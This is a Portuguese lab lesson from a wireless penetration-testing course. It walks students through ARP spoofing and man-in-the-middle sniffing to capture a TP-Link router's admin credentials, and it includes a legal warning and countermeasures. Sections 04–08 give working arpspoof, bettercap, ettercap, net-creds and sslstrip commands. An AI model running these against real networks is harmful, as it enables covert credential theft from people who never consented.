# 📡 Aula 11 — Testes de Invasão Wireless: ARP Spoofing e Man-in-the-Middle (Captura de Credenciais da WebGUI)

> **Módulo:** Redes Sem-Fio — Testes de Invasão (Pentest Wireless)
> **Aula:** 11 — Interceptação de Tráfego LAN via ARP Spoofing, Sniffing e Extração de Credenciais HTTP
> **Equipamentos homologados:** TP-Link Archer C50 (W) e TP-Link Archer EC220-G5 (login administrativo configurado pelos alunos na Aula 01)
> **Estação de ataque:** Kali Linux (ou Linux Mint 22.3, conforme Aula 02b) + `dsniff`/`bettercap`/`tcpdump`/`Wireshark`/`net-creds`

---

## ℹ️ Informações do Documento

| Campo | Descrição |
|---|---|
| **Autor** | _[preencher — Robson Vaamonde / Professor responsável]_ |
| **Data de criação** | 18/08/2026 |
| **Versão** | 0.01 |
| **Status** | ⚠️ Roteiro **ainda não testado/validado** em ambiente real de laboratório |
| **Pré-requisito** | Aula 01 (senha de administrador definida), Aula 02 (LAN/DHCP configurados) e Aula 10 (WebGUI mapeada) concluídas |
| **Escopo** | Captura **passiva/ativa** de credenciais da WebGUI trafegando em **HTTP puro** (porta 80) dentro da própria LAN do laboratório, via **ARP Spoofing** — não confundir com a Aula 10 (força bruta online contra o formulário de login) |

### 🔗 Links do Autor

| Canal | Link |
|---|---|
| Procedimentos em TI | http://procedimentosemti.com.br |
| Bora para Prática | http://boraparapratica.com.br |
| Site pessoal | http://vaamonde.com.br |
| Facebook — Procedimentos em TI | https://www.facebook.com/ProcedimentosEmTi |
| Facebook — Bora para Prática | https://www.facebook.com/BoraParaPratica |
| Instagram — Procedimentos em TI | https://www.instagram.com/procedimentoem |
| YouTube — Bora para Prática | https://www.youtube.com/boraparapratica |
| LinkedIn — Robson Vaamonde | https://www.linkedin.com/in/robson-vaamonde-0b029028/ |
| GitHub — Procedimentos em TI | https://github.com/vaamonde |

---

## ⚠️ Aviso Legal e Ético — Leia Antes de Iniciar

> Este material é destinado **exclusivamente a fins didáticos**, em **ambiente de rede controlada e isolada** (laboratório), com equipamentos de propriedade da instituição de ensino e consentimento expresso para os testes.
>
> A interceptação de tráfego de rede (ARP Spoofing, sniffing) contra dispositivos de terceiros, sem autorização formal, configura crime previsto no **Código Penal Brasileiro** (arts. 154-A e 154-B — invasão de dispositivo informático; art. 266 — interrupção de serviço telemático; art. 151-A — interceptação de comunicações), além de responsabilidade civil (Código Civil, arts. 927 a 943) e de possível violação à **LGPD** (Lei 13.709/2018), caso dados pessoais sejam capturados.
>
> Cada grupo deve realizar o ARP Spoofing **somente** contra o próprio Access Point e um computador/dispositivo de teste do próprio grupo, dentro da faixa de rede que lhe foi atribuída no laboratório (ex.: `172.16.100.0/24`). **Nunca** aponte o ataque para o BSSID/IP de outro grupo, para o gateway real da instituição, ou para qualquer dispositivo sem consentimento explícito.

---

## 📑 Sumário

1. [Contextualização — Por que o ARP Spoofing é Necessário](#01---contextualização--por-que-o-arp-spoofing-é-necessário)
2. [Preparação do Ambiente de Ataque](#02---preparação-do-ambiente-de-ataque)
3. [Descoberta do Alvo (Vítima) na Rede](#03---descoberta-do-alvo-vítima-na-rede)
4. [ARP Spoofing — Posicionamento como Man-in-the-Middle](#04---arp-spoofing--posicionamento-como-man-in-the-middle)
5. [Captura do Tráfego HTTP](#05---captura-do-tráfego-http)
6. [Extração das Credenciais Capturadas](#06---extração-das-credenciais-capturadas)
7. [Automatizando com Ferramentas Dedicadas](#07---automatizando-com-ferramentas-dedicadas)
8. [A Barreira do HTTPS](#08---a-barreira-do-https)
9. [Contramedidas e Discussão em Sala](#09---contramedidas-e-discussão-em-sala)
10. [Validação e Preenchimento do Relatório](#10---validação-e-preenchimento-do-relatório)
11. [Encerramento do Módulo](#-encerramento-do-módulo)

---

## 01 - Contextualização — Por que o ARP Spoofing é Necessário

Em uma rede local comutada (switch/roteador Wi-Fi moderno), o computador atacante **não recebe naturalmente** o tráfego de outros dispositivos — cada host só recebe os quadros endereçados especificamente a ele. Para "escutar" a comunicação entre um cliente-vítima e o painel administrativo do roteador (ex.: `172.16.100.254`), é necessário se posicionar logicamente no meio do caminho: o **ARP Spoofing (ARP Poisoning)**.

| Conceito | Descrição |
|---|---|
| **ARP (Address Resolution Protocol)** | Protocolo que traduz endereços IP em endereços MAC dentro de uma rede local — não possui autenticação, aceitando qualquer resposta como verdadeira. |
| **ARP Spoofing** | Envio de respostas ARP forjadas, fazendo a vítima acreditar que o MAC do atacante é o do roteador, e fazendo o roteador acreditar que o MAC do atacante é o da vítima. |
| **Man-in-the-Middle (MITM)** | Resultado do ARP Spoofing bem-sucedido: todo o tráfego entre vítima e roteador passa a trafegar pela máquina atacante antes de seguir ao destino real. |
| **IP Forwarding** | Recurso do sistema operacional atacante que repassa os pacotes recebidos ao destino verdadeiro, mantendo a conexão da vítima funcional e evitando levantar suspeita. |

| Situação | Sniffing direto funciona sem MITM? |
|---|---|
| Rede compartilhada antiga (hub) | ✅ Sim |
| Rede Wi-Fi/switch moderna (cenário do laboratório) | ❌ Não — exige ARP Spoofing |
| Login via HTTP puro (porta 80) | Credenciais em **texto claro**, capturáveis após o MITM |
| Login via HTTPS | Tráfego cifrado — ver seção 08 |

> 💡 **Ponto-chave desta aula:** diferente da Aula 10 (onde o Hydra **testa** senhas ativamente contra o formulário), aqui o ataque é **passivo do ponto de vista da senha** — não se tenta adivinhar nada, apenas se aguarda o momento em que o administrador legítimo **digita** a própria credencial, interceptando-a no meio do caminho.

---

## 02 - Preparação do Ambiente de Ataque

### 🔧 Procedimento

```bash
# Confirmar interface de rede e IP da máquina atacante (já associada à LAN do grupo)
ip a

# Instalar as ferramentas necessárias (Kali já traz a maioria pré-instalada)
sudo apt update
sudo apt install -y dsniff bettercap net-creds wireshark tcpdump arp-scan
```

```bash
# Habilitar o encaminhamento de pacotes (IP Forwarding)
sudo sysctl -w net.ipv4.ip_forward=1

# Para tornar a alteração persistente entre reboots (opcional)
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

| Parâmetro | Descrição |
|---|---|
| `net.ipv4.ip_forward=1` | Faz a máquina atacante repassar os pacotes recebidos ao destino real (roteador ou vítima), preservando a conectividade da vítima durante o ataque — essencial para não interromper a navegação e evitar desconfiança. |

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | `ip a` confirma o IP da interface atacante dentro da faixa `172.16.10X.0/24` do grupo. |
| 2 | `cat /proc/sys/net/ipv4/ip_forward` retorna `1`. |
| 3 | Todas as ferramentas (`arpspoof`, `bettercap`, `net-creds`, `tcpdump`, `wireshark`) respondem a `--help`/`--version` sem erro. |

---

## 03 - Descoberta do Alvo (Vítima) na Rede

### 🔧 Procedimento

```bash
# Varredura da LAN do grupo para identificar hosts ativos
sudo arp-scan --interface=eth0 172.16.100.0/24

# Alternativa via Nmap
sudo nmap -sn 172.16.100.0/24
```

| Campo | Descrição |
|---|---|
| `--interface` | Interface de rede local (cabeada ou Wi-Fi já associada) usada para a varredura ARP. |
| `172.16.100.0/24` | Faixa de rede LAN do grupo, conforme definida na Aula 02 — ajustar para a faixa real (`172.16.11X.0/24`, etc.). |
| `-sn` | Modo *ping scan* do Nmap — apenas descobre hosts ativos, sem escanear portas. |

➡️ Anotar o **IP** e o **MAC** do computador de teste do grupo que será usado como "vítima" (o dispositivo que fará login na WebGUI do roteador durante a captura).

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | O IP do roteador (`172.16.10X.254`) e o IP do computador-vítima aparecem na varredura. |
| 2 | MAC Address de ambos os dispositivos anotado corretamente para os próximos passos. |

---

## 04 - ARP Spoofing — Posicionamento como Man-in-the-Middle

### 🔧 Procedimento — Opção A: `arpspoof` (suíte `dsniff`)

Abrir **dois terminais simultâneos**, um para cada sentido do envenenamento (o MITM só é efetivo nos dois sentidos):

```bash
# Terminal 1 — dizer ao ROTEADOR que a máquina atacante é a VÍTIMA
sudo arpspoof -i eth0 -t 172.16.100.254 172.16.100.XXX

# Terminal 2 — dizer à VÍTIMA que a máquina atacante é o ROTEADOR
sudo arpspoof -i eth0 -t 172.16.100.XXX 172.16.100.254
```

| Parâmetro | Descrição |
|---|---|
| `-i` | Interface de rede utilizada no envenenamento. |
| `-t <alvo> <ip_falsificado>` | Envia respostas ARP forjadas ao `<alvo>`, afirmando que o `<ip_falsificado>` corresponde ao MAC da máquina atacante. |

### 🔧 Procedimento — Opção B: `bettercap` (recomendado — mais moderno e integrado)

```bash
sudo bettercap -iface eth0
```

Dentro do console interativo do `bettercap`:

```
net.probe on
set arp.spoof.targets 172.16.100.XXX
arp.spoof on
net.sniff on
```

| Módulo | Descrição |
|---|---|
| `net.probe` | Varre ativamente a rede para manter a lista de hosts atualizada. |
| `arp.spoof.targets` | Define o(s) IP(s) da(s) vítima(s) a envenenar — se omitido, o `bettercap` envenena toda a sub-rede (evitar em laboratório com vários grupos). |
| `arp.spoof on` | Inicia o envenenamento ARP nos dois sentidos automaticamente. |
| `net.sniff on` | Ativa o sniffer embutido, que já destaca automaticamente credenciais HTTP, FTP, POP3, IMAP e outras capturadas em texto claro. |

> ⚠️ **Atenção — escopo restrito:** ao usar `bettercap` sem `arp.spoof.targets` definido, **todos os dispositivos da sub-rede** (inclusive de outros grupos) podem ser afetados. Sempre restrinja o alvo explicitamente, conforme o aviso legal desta aula.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | Na tabela ARP da vítima (`arp -a` no Windows/Linux da máquina-vítima), o MAC associado ao IP do roteador passa a ser o MAC da máquina atacante. |
| 2 | A vítima continua navegando normalmente (sem quedas de conexão perceptíveis), confirmando que o IP Forwarding está funcionando. |

---

## 05 - Captura do Tráfego HTTP

Em um terceiro terminal, paralelamente ao ARP Spoofing em execução, capturar o tráfego direcionado ao roteador:

### 🔧 Procedimento

```bash
# Captura filtrada por IP do roteador e porta 80 (WebGUI HTTP)
sudo tcpdump -i eth0 host 172.16.100.254 and port 80 -w captura_router.pcap -v
```

| Parâmetro | Descrição |
|---|---|
| `host 172.16.100.254` | Filtra apenas o tráfego de/para o IP do roteador-alvo. |
| `and port 80` | Restringe a captura à porta padrão do HTTP (WebGUI sem criptografia). |
| `-w captura_router.pcap` | Grava a captura em arquivo `.pcap`, para análise posterior no Wireshark. |

➡️ **Aguarde** até que o administrador (usuário de teste) realize o login na interface web do roteador (`http://172.16.100.254`) durante a captura.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | O arquivo `captura_router.pcap` cresce em tamanho durante o login de teste. |
| 2 | `tcpdump -r captura_router.pcap` (sem filtro) lista pacotes HTTP capturados. |

---

## 06 - Extração das Credenciais Capturadas

### 🔧 Procedimento — Análise Manual via Wireshark

```bash
wireshark captura_router.pcap
```

Aplicar o filtro de exibição:

```
ip.addr == 172.16.100.254 && http
```

### 🔐 Cenário A — Login via HTTP Basic Authentication

Se o navegador da vítima exibir um **popup nativo** pedindo usuário/senha (sem formulário na página), o Wireshark mostrará um cabeçalho `Authorization: Basic <valor_em_base64>`.

```bash
# Decodificar o valor capturado
echo "YWRtaW46U2VuYWN0aXRAMTIz" | base64 -d
# Resultado esperado: admin:Senactit@123
```

### 🔐 Cenário B — Login via Formulário HTML (POST)

Para a maioria dos firmwares TP-Link modernos (conforme já identificado na Aula 10, item 04), o login ocorre via **formulário `POST`**:

| Passo | Ação |
|---|---|
| 1 | No Wireshark, localizar o pacote `HTTP POST` correspondente ao envio do formulário de login. |
| 2 | Clicar com o botão direito → **Follow → HTTP Stream**. |
| 3 | Localizar os campos `username=` e `password=` (ou nomes equivalentes) no corpo da requisição. |

> ⚠️ **Atenção:** se os valores capturados aparecerem como um hash/string cifrada (e não a senha em texto plano), o firmware provavelmente aplica criptografia client-side via JavaScript antes do envio — mesma limitação já discutida na Aula 10, seção 07. Nesse caso, trate como ponto de discussão teórica, e não como falha de captura.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | Usuário e senha extraídos coincidem com os configurados na Aula 01 (`admin` / `Senactit@123`). |
| 2 | Login manual no painel, usando as credenciais capturadas, confirma o acesso administrativo completo. |

---

## 07 - Automatizando com Ferramentas Dedicadas

Para evitar vasculhar manualmente o `.pcap`, algumas ferramentas já filtram e exibem credenciais automaticamente em tempo real.

### 🔧 `net-creds` — Extração em Tempo Real

```bash
# Direto pela interface de rede, durante o ARP Spoofing
sudo net-creds -i eth0

# Ou reprocessando uma captura já salva
sudo net-creds -p captura_router.pcap
```

### 🔧 `ettercap` — ARP Spoofing + Sniffing HTTP Integrados

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /172.16.100.254// /172.16.100.XXX//
```

| Parâmetro | Descrição |
|---|---|
| `-T` | Interface em modo texto (terminal). |
| `-M arp:remote` | Ativa o módulo de ARP Spoofing (MITM) em modo *remote*, permitindo capturar tráfego destinado à Internet além do tráfego local. |
| `/172.16.100.254// /172.16.100.XXX//` | Define o par de alvos do MITM: roteador e vítima. |

> 💡 **Vantagem:** tanto o `bettercap` (seção 04) quanto o `ettercap` e o `net-creds` já reconhecem e destacam automaticamente padrões de credenciais HTTP, FTP, Telnet, POP3 e IMAP, dispensando a leitura manual pacote a pacote na maioria dos casos.

### ✅ Testes de Validação

| # | Teste |
|---|---|
| 1 | `net-creds` ou `ettercap` exibem a linha de credenciais capturadas automaticamente, sem necessidade de abrir o Wireshark. |

---

## 08 - A Barreira do HTTPS

Alguns firmwares TP-Link mais recentes podem forçar o acesso à WebGUI via **HTTPS** (`https://172.16.100.254`), especialmente quando o Gerenciamento Remoto (Aula 10, item 02) está habilitado.

| Situação | Resultado da captura |
|---|---|
| WebGUI em HTTP puro (porta 80) | Credenciais em texto claro, capturáveis normalmente (seções 05-07). |
| WebGUI em HTTPS (porta 443/8443) | Wireshark mostra apenas `TLS Application Data` — tráfego cifrado, sem valor prático sem a chave privada do servidor. |

### 🔧 Tentativa de Downgrade (fins demonstrativos)

```bash
# Módulo de proxy HTTPS do bettercap, com tentativa de rebaixar para HTTP
set https.proxy.sslstrip true
https.proxy on
```

> ⚠️ **Expectativa realista:** navegadores modernos e mecanismos como **HSTS (HTTP Strict Transport Security)** normalmente **bloqueiam** esse tipo de rebaixamento silencioso, exibindo alerta de certificado inválido para a vítima. Assim como no **Cenário A da Aula 09 (WPA3-SAE)**, trate esta seção como **demonstração conceitual de por que o ataque falha**, e não como um procedimento com sucesso garantido — reforce essa limitação com a turma como o principal motivo de recomendar HTTPS/gerenciamento remoto desabilitado em produção.

---

## 09 - Contramedidas e Discussão em Sala

| Contramedida | Como mitiga o ataque desta aula |
|---|---|
| **WebGUI apenas em HTTPS** | Impede a leitura em texto claro das credenciais mesmo com MITM bem-sucedido (ver seção 08). |
| **Gerenciamento Remoto (WAN) desabilitado** | Reduz a superfície de ataque ao restringir o MITM à rede local, exigindo que o atacante já tenha acesso físico/lógico à LAN. |
| **Detecção de ARP Spoofing (arpwatch, ferramentas de IDS)** | Monitora mudanças suspeitas na tabela ARP da rede, alertando administradores sobre possível MITM em andamento. |
| **DHCP Snooping / Dynamic ARP Inspection (em switches gerenciáveis)** | Recurso de camada 2 que valida a legitimidade das respostas ARP, bloqueando pacotes forjados — não disponível nos APs TP-Link domésticos deste laboratório, mas relevante em ambientes corporativos. |
| **Autenticação em dois fatores no painel administrativo** | Mesmo com a senha capturada, um segundo fator impede o acesso completo — recurso ainda raro em roteadores domésticos. |

> 💡 **Mensagem central para a turma:** o ARP Spoofing explora uma fragilidade estrutural do protocolo ARP (ausência de autenticação), e não uma falha específica do TP-Link — por isso a defesa mais eficaz nesta camada é **nunca trafegar credenciais em texto claro** (HTTPS obrigatório), independentemente de quão "seguro" o restante da rede pareça estar.

---

## 10 - Validação e Preenchimento do Relatório

### ✅ Testes de Validação Final

| # | Teste |
|---|---|
| 1 | Registrar no relatório: IP/MAC do roteador, IP/MAC da vítima, ferramenta de ARP Spoofing utilizada e horário do ataque. |
| 2 | Registrar se a WebGUI operava em HTTP ou HTTPS, e o resultado da captura em cada caso. |
| 3 | Registrar as credenciais capturadas (usuário/senha) e confirmar acesso manual ao painel com elas. |
| 4 | Comparar o esforço desta aula com o da Aula 10 (Hydra) — discutir em grupo por que a captura passiva (aguardar o login real) pode ser mais eficaz do que a força bruta ativa, quando o atacante já está posicionado na rede. |
| 5 | Confirmar que o ARP Spoofing foi **interrompido** ao final do teste (`Ctrl+C` nos processos de `arpspoof`/`bettercap`/`ettercap`), restaurando a tabela ARP normal da rede. |

## ✅ Checklist Final da Aula

- [ ] Ferramentas instaladas e validadas (`arpspoof`, `bettercap`, `net-creds`, `tcpdump`, `wireshark`, `arp-scan`)
- [ ] IP Forwarding habilitado na máquina atacante
- [ ] IP/MAC do computador-vítima identificado via `arp-scan`/`nmap`
- [ ] ARP Spoofing realizado nos dois sentidos (roteador ↔ vítima) restrito ao escopo do grupo
- [ ] Tráfego HTTP capturado durante um login de teste (`tcpdump`/Wireshark)
- [ ] Credenciais extraídas manualmente (Basic Auth ou HTTP POST) ou via ferramenta automatizada (`net-creds`/`ettercap`)
- [ ] Login manual validado com as credenciais capturadas
- [ ] Cenário HTTPS testado e documentado como limitação (quando aplicável)
- [ ] Contramedidas discutidas em grupo (seção 09)
- [ ] ARP Spoofing interrompido e tabela ARP da rede restaurada ao final do teste
- [ ] Relatório do grupo preenchido com todos os dados da seção 10

---

## 🏁 Encerramento do Módulo

Com a Aula 11, o módulo de **Testes de Invasão em Rede Wireless** amplia a discussão iniciada na Aula 10: além de atacar a **chave Wi-Fi** (802.11 — Aulas 06-09) e a **senha do painel administrativo via força bruta ativa** (Aula 10), esta aula demonstra a captura **passiva** de credenciais através da interceptação de tráfego na camada de rede/aplicação — reforçando que a segurança de um Access Point depende tanto da robustez de suas senhas quanto da **forma como o tráfego administrativo trafega na rede** (texto claro vs. criptografado).

### 📊 Quadro-Resumo Ampliado do Módulo

| Aula | Alvo do ataque | Camada | Ferramenta principal | Tipo de ataque |
|---|---|---|---|---|
| 06 | Chave WEP | 802.11 | `aircrack-ng` (criptoanálise) | Ativo (captura de IVs) |
| 07 | PIN WPS | 802.11 | `reaver`/`pixiewps` | Ativo (força bruta de PIN) |
| 08 | Chave WPA/WPA2-PSK | 802.11 | `aircrack-ng`/`hashcat` | Ativo (dicionário offline) |
| 09 | Chave WPA3-SAE | 802.11 | N/A (resistente por design) | Não aplicável / vetor de downgrade |
| 10 | Senha do painel administrativo (LAN/WAN) | HTTP/HTTPS (aplicação) | `hydra` | Ativo (força bruta online) |
| **11** | **Credenciais do painel administrativo em trânsito** | **Rede local (ARP) + HTTP (aplicação)** | **`arpspoof`/`bettercap`/`Wireshark`** | **Passivo (MITM + sniffing)** |

> 💡 **Mensagem final para a turma:** uma rede wireless só está de fato protegida quando todas as camadas são endurecidas em conjunto — chave Wi-Fi forte (Aula 08/09), WPS desabilitado (Aula 04/07), senha administrativa forte com Gerenciamento Remoto desabilitado (Aula 10), **e** tráfego administrativo sempre criptografado (HTTPS), evitando que um simples MITM na rede local exponha as mesmas credenciais que as camadas anteriores tentaram proteger.

> 📌 **Sugestão de continuidade do curso:** com o módulo de captura de credenciais concluído, os próximos passos naturais seriam (a) ataques de Evil Twin / Rogue AP (criar um AP falso para atrair clientes e repetir esta captura sem precisar de ARP Spoofing), (b) DNS Spoofing combinado ao MITM desta aula, e (c) consolidação de todos os resultados das Aulas 06-11 no documento de homologação (`07-checklist/01-HomologacaoRedesSemFioKali.md`).
